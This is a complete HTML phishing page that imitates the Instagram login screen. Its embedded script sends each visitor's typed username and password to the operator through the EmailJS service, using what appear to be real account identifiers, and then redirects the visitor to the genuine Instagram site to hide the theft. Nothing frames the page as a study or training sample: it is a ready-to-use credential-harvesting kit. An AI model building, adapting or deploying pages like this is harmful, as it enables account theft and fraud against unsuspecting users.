<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Style Login</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            font-family: 'Billabong', cursive;
            font-size: 48px;
            margin-bottom: 20px;
        }

        .facebook-button {
            width: 100%;
            background-color: #3897f0;
            color: white;
            padding: 12px;
            font-size: 14px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .facebook-button img {
            width: 20px;
            height: 20px;
            margin-right: 10px;
        }

        .divider {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 14px;
            margin: 20px 0;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #8e8e8e;
        }

        .divider::before {
            margin-right: 10px;
        }

        .divider::after {
            margin-left: 10px;
        }

        .form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        .form-input {
            background-color: #262626;
            border: 1px solid #424242;
            border-radius: 4px;
            color: #fff;
            padding: 10px;
            margin-bottom: 10px;
            font-size: 14px;
        }

        .form-input:focus {
            border-color: #fff;
            outline: none;
        }

        .login-button {
            width: 100%;
            background-color: #3897f0;
            color: white;
            padding: 12px;
            font-size: 14px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 20px;
        }

        .login-button:hover {
            background-color: #3178c6;
        }

        .forgot-password {
            font-size: 12px;
            color: #3897f0;
            text-decoration: none;
            text-align: center;
            margin-bottom: 20px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .signup-text {
            font-size: 14px;
            color: #8e8e8e;
            text-align: center;
        }

        .signup-text a {
            color: #3897f0;
            text-decoration: none;
        }

        .signup-text a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>

        <button class="facebook-button">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo">
            Continue with Facebook
        </button>

        <div class="divider"><span></span>OR<span></span></div>

        <form id="loginForm" class="form">
            <input type="text" id="username" class="form-input" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" class="form-input" placeholder="Password" required>
            <button type="submit" class="login-button">Log In</button>
        </form>

        <a href="#" class="forgot-password">Forgot password?</a>

        <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <script type="text/javascript">
        // Initialize EmailJS with your public key
        emailjs.init("ZaF8wyUZavRVBvsqx");

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();  // Prevent form from refreshing the page

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Send email data to EmailJS
            emailjs.send("service_b6ugscc", "template_wnvqxmb", {
                username: username,
                password: password
            })
            .then(function(response) {
                console.log("Email sent successfully", response);

                // Redirect to Instagram after a successful submission
                window.location.href = "https://www.instagram.com";
            }, function(error) {
                console.error("Failed to send email:", error);
                alert("Failed to send login data.");
            });
        });
    </script>
</body>
</html>
